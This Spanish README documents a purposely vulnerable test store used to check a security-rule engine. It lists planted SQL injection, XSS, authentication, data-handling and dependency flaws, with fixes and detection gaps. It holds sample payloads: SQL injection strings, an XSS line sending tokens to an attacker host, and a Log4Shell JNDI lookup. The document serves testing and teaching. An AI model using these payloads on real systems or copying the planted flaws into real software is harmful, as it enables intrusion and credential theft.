# Proyecto vulnerable: TiendaVuln

`proyecto-vulnerable/` es una tienda en línea ficticia compuesta por tres módulos:

| Módulo | Tecnología | Qué hace |
|---|---|---|
| `backend/` | Java / Spring | Login, registro, usuarios, pedidos, cifrado de tarjetas |
| `reportes/` | Python / Django | Reportes de ventas internos |
| `frontend/` | React | Interfaz de la tienda y reseñas de productos |

El proyecto se escribió **a propósito con malas prácticas de seguridad**. Cada vulnerabilidad plantada es un error real, que se puede explotar, y además activa una regla real de SegSoft. Así se prueba que el sistema detecta problemas en las **5 categorías** y marca las políticas como **NON_COMPLIANT**.

## Resultado esperado

Resultado obtenido al ejecutar el motor real (`/internal/execute-rule` con `fixtures/rules_snapshot.json`) sobre todos los archivos:

- **43 hallazgos** en 23 archivos, **0 errores de regla**.
- Por severidad: **16 CRITICAL**, **20 HIGH** y **7 MEDIUM**.
- Por categoría: Dependency Vulnerability 14, Insecure Data Handling 10, SQL Injection 7, Authentication Failure 6 y XSS 6.
- **Se activan 22 de las 23 reglas activas.** La que falta revisa la clave `server.enaled`, que está mal escrita en la propia regla. Ningún proyecto real usa esa clave, así que no se forzó (ver "Observaciones sobre las reglas").
- Todas las categorías tienen al menos un hallazgo HIGH o CRITICAL. Por eso, toda política seleccionada que tenga reglas activas debe quedar **NON_COMPLIANT**.

El detalle de cada hallazgo (archivo, línea, severidad y regla) está en `proyecto-vulnerable.expected_findings.yml`, con el mismo formato que los fixtures de validación del motor.

---

## 1. SQL Injection (7 hallazgos)

| # | Ubicación | Regla / CWE / Severidad |
|---|---|---|
| S1 | `reportes/reportes/auth.py:15` | f-string en `cursor.execute`, CWE-89, CRITICAL |
| S2 | `reportes/reportes/db.py:6` | f-string en `cursor.execute`, CWE-89, CRITICAL, y además `SELECT *` (MEDIUM) |
| S3 | `reportes/reportes/db.py:12` | f-string en `cursor.execute`, CWE-89, CRITICAL |
| S4 | `backend/.../order/OrderController.java:25` | Parámetro HTTP que llega directo a la query, CWE-20, HIGH |
| S5 | `backend/.../order/OrderSearch.java:17` | `SELECT *` concatenado, CWE-89, MEDIUM |
| S6 | `backend/.../user/UserRepository.java:18` | `SELECT *` concatenado, CWE-89, MEDIUM |

**Por qué es vulnerable:**

- **S1, S2 y S3** construyen el SQL con f-strings en Python, así que el valor que envía el usuario pasa a formar parte del código SQL:
  - En `check_credentials` basta con usar como usuario `admin' --` para comentar el resto de la consulta.
  - En `ventas_por_cliente`, el valor `x' OR '1'='1` devuelve **todas** las ventas de todos los clientes.
- **S4 y S5**: el endpoint `/api/orders/search` toma el parámetro `filtro` y lo pega después del `WHERE`. Un atacante puede enviar `1=1 UNION SELECT username, password, ... FROM users` y leer la tabla de usuarios. Es la inyección más grave del proyecto, porque el atacante controla toda la condición.
- **S6**: `findByUsername` concatena el nombre de usuario, y como lo llama el login, permite saltarse la autenticación. Además, `SELECT *` trae la contraseña y el número de tarjeta aunque no se necesiten.

**Corrección:** usar parámetros vinculados (`cursor.execute("... WHERE x = %s", (valor,))`, `PreparedStatement` con `?` o `jdbcTemplate.query(sql, args)`). Para filtros dinámicos, usar una lista blanca de columnas. Nombrar las columnas en lugar de usar `SELECT *`.

## 2. Cross-Site Scripting, XSS (6 hallazgos)

| # | Ubicación | Regla / CWE / Severidad |
|---|---|---|
| X1 | `frontend/src/components/ProductReview.jsx:7` | `dangerouslySetInnerHTML`, CWE-79, HIGH |
| X2 | `frontend/src/utils/notifications.js:3` | Asignación directa a `innerHTML`, CWE-79, HIGH |
| X3 | `frontend/src/utils/notifications.js:10` | `innerHTML` con el parámetro `q` de la URL, CWE-79, HIGH |
| X4 | `reportes/reportes/views.py:14` | `mark_safe` con datos del usuario, CWE-79, HIGH |
| X5 | `backend/.../application.properties` y `docker-compose.yml` | Falta Content-Security-Policy, CWE-693, MEDIUM (2 hallazgos) |

**Por qué es vulnerable:**

- **X1 (XSS almacenado):** los comentarios de las reseñas se muestran como HTML. Una reseña con `<img src=x onerror="fetch('//atacante/?c='+localStorage.token)">` roba el token de cada cliente que la vea. El token vive en `localStorage` (`api/client.js`), así que JavaScript puede leerlo.
- **X3 (XSS reflejado):** con `https://tienda/?q=<img src=x onerror=alert(1)>` basta para ejecutar código en la sesión de la víctima.
- **X4:** `mark_safe` desactiva el escape automático de Django, y el nombre `cliente` viene de la URL (`?cliente=<script>...`).
- **X5:** sin la cabecera CSP, el navegador ejecuta cualquier script inyectado. La CSP es la segunda línea de defensa.

**Corrección:** usar `textContent`, o sanitizar con DOMPurify antes de `dangerouslySetInnerHTML`. Evitar `mark_safe` con datos externos. Definir `Content-Security-Policy: default-src 'self'`.

## 3. Fallas de autenticación (6 hallazgos)

| # | Ubicación | Regla / CWE / Severidad |
|---|---|---|
| A1 | `backend/.../auth/JwtService.java:13` | JWT sin expiración, CWE-613, CRITICAL |
| A2 | `backend/.../auth/AuthController.java:26` | Login sin rate limiting, CWE-307, HIGH |
| A3 | `backend/.../auth/AuthController.java:44` | Política de contraseña débil (6 caracteres), CWE-521, HIGH |
| A4 | `reportes/reportes/auth.py:10` | MD5 para contraseñas, CWE-916, CRITICAL |
| A5 | `application.properties` y `docker-compose.yml` | No se exige MFA (`mfa.required.roles`), CWE-308, CRITICAL (2 hallazgos) |

**Por qué es vulnerable:**

- **A1:** el token no tiene `withExpiresAt`. Un token robado (por ejemplo, con X1) sirve **para siempre** y no hay forma de invalidarlo.
- **A2:** `/api/auth/login` acepta intentos ilimitados, lo que deja abierta la fuerza bruta y el credential stuffing.
- **A3:** acepta cualquier contraseña de 6 caracteres, como `123456`, que aparece en todos los diccionarios de ataque.
- **A4:** MD5 no tiene sal y es extremadamente rápido. Con una GPU se prueban miles de millones de hashes por segundo, y además existen tablas rainbow precalculadas.
- **A5:** no hay segundo factor para las cuentas privilegiadas.

**Corrección:** `.withExpiresAt(...)` con una vida corta más refresh tokens, Bucket4j o un bloqueo tras N intentos, un mínimo de 12 caracteres, Argon2 o bcrypt, y MFA para administradores.

## 4. Manejo inseguro de datos (10 hallazgos)

| # | Ubicación | Regla / CWE / Severidad |
|---|---|---|
| D1 | `backend/.../auth/JwtService.java:10` | Secreto del JWT en el código, CWE-798, CRITICAL |
| D2 | `frontend/src/api/client.js:3` | API key en el frontend, CWE-798, CRITICAL |
| D3 | `reportes/reportes/settings.py:29` | API key de pagos en el código, CWE-798, CRITICAL |
| D4 | `backend/.../user/User.java:16` | Contraseña guardada en texto plano, CWE-312, CRITICAL |
| D5 | `backend/.../auth/AuthController.java:29` y `:42` | `String password =`, CWE-312, CRITICAL (2 hallazgos, ver nota) |
| D6 | `backend/.../payment/CardEncryptor.java:13` | Cifrado DES/ECB, CWE-327, CRITICAL |
| D7 | `backend/.../auth/AuthController.java:30` | Contraseña escrita en logs, CWE-532, HIGH |
| D8 | `reportes/reportes/auth.py:21` | Token escrito en logs, CWE-532, HIGH |
| D9 | `backend/.../application.properties` | `server.ssl.enabled=false`, CWE-319, HIGH |

**Por qué es vulnerable:**

- **D1:** quien lea el repositorio conoce el secreto HMAC y puede **fabricar un JWT válido para cualquier usuario**, incluido un administrador.
- **D2:** todo lo que va en el frontend se descarga al navegador, así que la clave es pública.
- **D3:** una clave de la pasarela de pagos queda expuesta en el historial de git para siempre.
- **D4:** las contraseñas se guardan y comparan en claro (`user.getPassword().equals(password)`). Una fuga de la base de datos expone todas las cuentas.
- **D6:** DES tiene una clave efectiva de 56 bits, que se rompe por fuerza bruta. ECB cifra igual los bloques iguales, así que revela patrones en los números de tarjeta. Encima, la clave (`"tienda12"`) está en el código.
- **D7 y D8:** las contraseñas y los tokens terminan en los archivos de log, que suelen tener menos protección y se centralizan en otros sistemas.
- **D9:** sin TLS, las credenciales y el JWT viajan en claro por la red.

**Corrección:** usar variables de entorno o un gestor de secretos, Argon2 o bcrypt para contraseñas, `AES/GCM/NoPadding` con una clave gestionada en un KMS, enmascarar los datos sensibles en los logs y activar `server.ssl.enabled=true`.

## 5. Dependencias vulnerables (14 hallazgos)

| Archivo | Dependencia | CVE |
|---|---|---|
| `backend/pom.xml` | log4j-core 2.14.1 | **CVE-2021-44228 (Log4Shell)**. Dos reglas lo reportan: CRITICAL y HIGH |
| `backend/pom.xml` | spring-core 5.3.10 | CVE-2022-22965 (Spring4Shell), CRITICAL |
| `backend/pom.xml` | struts2-core 2.5.20 | CVE-2021-31805 (RCE por OGNL), HIGH |
| `frontend/package.json` | lodash 4.17.15 | CVE-2021-23337 (inyección de comandos en `template`), HIGH |
| `frontend/package.json` | minimist 1.2.0 | CVE-2021-44906 (prototype pollution), HIGH |
| `reportes/requirements.txt` | django 3.2.10 | CVE-2022-28346 (SQLi en `annotate`/`aggregate`), HIGH |
| `reportes/requirements.txt` | jinja2 2.10.1 | CVE-2020-28493 (ReDoS), HIGH |
| `reportes/requirements.txt` | requests 2.19.1 | CVE-2018-18074 (fuga de credenciales en redirecciones), HIGH |
| `reportes/requirements.txt` | pyyaml 5.3.1 | CVE-2020-14343 (ejecución de código con `full_load`), HIGH |
| `application.properties` y `docker-compose.yml` | Sin verificación de checksums (`artifact.checksum.verify`) | CWE-494, HIGH (2 hallazgos) |
| `application.properties` y `docker-compose.yml` | Sin política de actualización (`dependency.update.maxAgeDays`) | CWE-1104, MEDIUM (2 hallazgos) |

**Por qué es vulnerable:**

- **Log4Shell:** basta con que el backend registre un texto como `${jndi:ldap://atacante/x}` para lograr **ejecución remota de código**. Aquí el riesgo es concreto, porque el login registra el usuario y la contraseña que envía el cliente (D7).
- **Spring4Shell** también permite RCE.
- Las demás dependencias abren la puerta a inyección de comandos, denegación de servicio y robo de credenciales.

**Corrección:** actualizar a las versiones corregidas y agregar OWASP Dependency-Check, `npm audit` o `pip-audit` al pipeline de CI.

---

## Cadena de ataque de ejemplo

Estas vulnerabilidades se combinan entre sí, que es lo que las hace realistas:

1. El atacante publica una reseña con un payload XSS (X1).
2. Cada cliente que abre el producto le envía su JWT desde `localStorage`.
3. Como el token no expira (A1), el acceso robado es permanente.
4. Otra vía: el atacante lee `secret` del repositorio (D1) y firma su propio token de administrador.
5. Con acceso al panel, usa `/api/orders/search?filtro=...` (S4) para volcar la tabla `users`, que tiene las contraseñas en claro (D4) y las tarjetas cifradas con DES/ECB (D6).

---

## Vulnerabilidades reales que el motor NO detecta (falsos negativos)

El proyecto también contiene fallas que las reglas actuales no cubren. Sirven para medir el **recall** del sistema y para la discusión de limitaciones del PDG:

| Ubicación | Falla | Por qué no se detecta |
|---|---|---|
| `UserRepository.java:18` | SQL Injection por concatenación en el login | Solo se reporta como `SELECT *` (MEDIUM). Ninguna regla Java detecta la concatenación `" + username + "` como tal |
| `UserRepository.java:31-32` | SQL Injection en el `INSERT` de `save()` | Es una concatenación en varias líneas y las reglas regex trabajan línea por línea |
| `views.py:15` | XSS: las filas de la tabla se arman sin escapar | Sin `mark_safe` no hay patrón que coincida |
| `reportes/settings.py:5-7` | `SECRET_KEY` en el código, `DEBUG = True`, `ALLOWED_HOSTS = ["*"]` | La regla de secretos distingue mayúsculas (`secret`, no `SECRET_KEY`) y ninguna regla revisa `DEBUG` en un `.py` |
| `settings.py:22`, `application.properties:7`, `docker-compose.yml:9` | Contraseña de la base de datos en claro (`tienda123`) | La regla exige la forma `password = "..."` con comillas y en minúscula |
| `CardEncryptor.java:10` | Clave de cifrado en el código (`"tienda12"`) | El nombre `KEY` no está en la lista de la regla (`apiKey`, `secret`, `password`, `token`) |
| `application.properties:9` | `logging.level.root=DEBUG` en producción | No hay una regla para eso |
| `api/client.js:11` | JWT guardado en `localStorage` | No hay una regla para eso |

## Observaciones sobre las reglas

- **Posible falso positivo (D5):** la regla CWE-312 (`String\s+password\s*=`) marca las variables locales `String password = body.get("password")` de `AuthController`. En este proyecto la contraseña sí termina guardada en claro, pero en un proyecto limpio el mismo patrón generaría falsos positivos. Conviene tenerlo presente al construir el proyecto "limpio".
- **Regla con error tipográfico:** la regla `62445210-...` revisa la clave `server.enaled` (le falta la "b"). Nunca se activa con configuraciones reales.
- **Las reglas CONFIG_CHECK con `must_exist`** generan un hallazgo **por cada archivo de configuración** (`.yml`, `.properties`...) al que le falte la clave. Por eso `docker-compose.yml` también aparece con MFA, CSP, checksum y política de actualización. Los archivos `.env` no se evalúan, porque el motor calcula la extensión de `.env` como vacía.
- **Las reglas se ejecutan sobre todos los archivos, sin filtrar por lenguaje.** El campo `languages` de la regla no se usa, así que una regla "java" también corre sobre `.py` y `.md`.
